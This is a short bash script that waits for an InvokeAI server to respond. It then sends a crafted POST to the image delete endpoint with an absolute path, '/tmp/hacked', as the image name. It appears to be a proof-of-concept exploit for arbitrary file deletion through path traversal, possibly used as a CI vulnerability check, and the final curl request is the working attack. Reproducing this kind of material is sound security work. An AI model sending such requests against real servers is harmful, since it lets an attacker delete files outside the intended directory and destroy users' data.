#!/bin/bash
IS_CI_RUN=$1 


if [ "$IS_CI_RUN" == "true" ]; then
  HOST="invokeai"
else
  HOST="localhost"
fi 

start_time=$(date +%s)
timeout=60

while true; do
    if curl -s --head --request GET http://$HOST:9090/api/v1/app/version | grep "200 OK" > /dev/null; then
        echo "Server is running"
        break
    fi

    current_time=$(date +%s)
    if [ $((current_time - start_time)) -ge $timeout ]; then
        echo "Server failed to start within $timeout seconds"
        exit 1
    fi

    sleep 1
done

curl -X POST http://$HOST:9090/api/v1/images/delete \
     -H "Host: $HOST:9090" \
     -H "Accept-Language: zh-CN" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36" \
     -H "Accept: */*" \
     -H "Referer: http://$HOST:9090/" \
     -H "Accept-Encoding: gzip, deflate, br" \
     -H "Connection: keep-alive" \
     -H "Content-Type: application/json" \
     --data '{"image_names":["/tmp/hacked"]}'